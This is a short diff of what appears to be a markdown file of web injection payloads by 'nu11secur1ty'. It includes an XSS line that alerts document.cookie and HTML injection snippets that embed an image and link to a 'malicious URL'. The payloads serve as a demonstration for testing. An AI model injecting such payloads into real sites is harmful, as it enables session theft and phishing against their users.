@@ -35,8 +35,8 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ## without error report + link to malicious URL
 
 ```js
-<span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>link<a href=http://example.com/>
-<a href="https://www.nu11secur1ty.com/"></а><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>
+<span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>link<a href=http://example.com/></span>
+<img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>
 <a href="https://www.nu11secur1ty.com/"><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif" width=150" height="70">
 
 
